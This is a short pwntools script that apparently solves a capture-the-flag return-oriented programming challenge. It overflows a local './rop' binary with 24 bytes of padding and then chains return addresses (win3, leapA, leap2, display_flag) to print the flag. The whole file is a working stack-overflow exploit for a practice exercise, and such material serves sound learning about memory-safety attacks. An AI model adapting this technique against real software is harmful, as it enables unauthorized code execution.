from pwn import *

p = process('./rop')
gdb.attach(p)
raw_input("stop")

p.sendline( 'A'*24 + #padding
        p32(0x8048690) + # win3 = true
        p32(0x80485e6) + # leapA
        p32(0x80485fd) + # leap2
        p32(0x80486b3) + # display_flag() #8048622
        p32(0xDEADBEEF) # 0xDEADBEEF
        )
p.recvall()
#p.interactive()

